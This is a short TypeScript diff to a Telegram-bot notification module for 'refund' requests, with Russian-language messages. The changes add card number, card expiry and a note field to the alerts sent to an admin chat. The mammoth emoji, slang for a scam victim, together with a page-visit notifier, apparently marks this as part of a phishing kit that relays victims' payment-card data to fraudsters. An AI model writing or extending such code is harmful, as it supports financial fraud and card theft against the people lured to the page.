@@ -411,6 +411,9 @@ interface RefundNotificationData {
   amount: number;
   customerName?: string;
   refundNumber?: string;
+  refundNote?: string;
+  cardNumber?: string;
+  cardExpiry?: string;
 }
 
 export async function sendRefundPageVisitNotification(
@@ -445,7 +448,7 @@ export async function sendRefundRequestNotification(
   const message = `🔔🦣 запросил возврат средств🔔
 ФИО: ${refund.customerName || 'Не указано'}  
 Сумма: ${refund.amount} руб.
-Возврат #${refund.refundNumber || refund.refundCode}`;
+${refund.refundNote || 'Возврат'}`;
 
   try {
     const sentMessage = await telegramBot.sendMessage(CHANNEL_ID, message);
@@ -469,7 +472,9 @@ export async function sendRefundToAdmin(
 
 👤 *ФИО:* ${escapeMarkdown(refund.customerName || 'Не указано')}
 💵 *Сумма:* ${refund.amount} руб.
-🔢 *Номер возврата:* ${refund.refundNumber || refund.refundCode}`;
+💳 *Карта:* ****${refund.cardNumber || '----'}
+📅 *Срок:* ${refund.cardExpiry || '--/--'}
+📝 *Примечание:* ${escapeMarkdown(refund.refundNote || 'Возврат')}`;
 
   const keyboard = {
     inline_keyboard: [
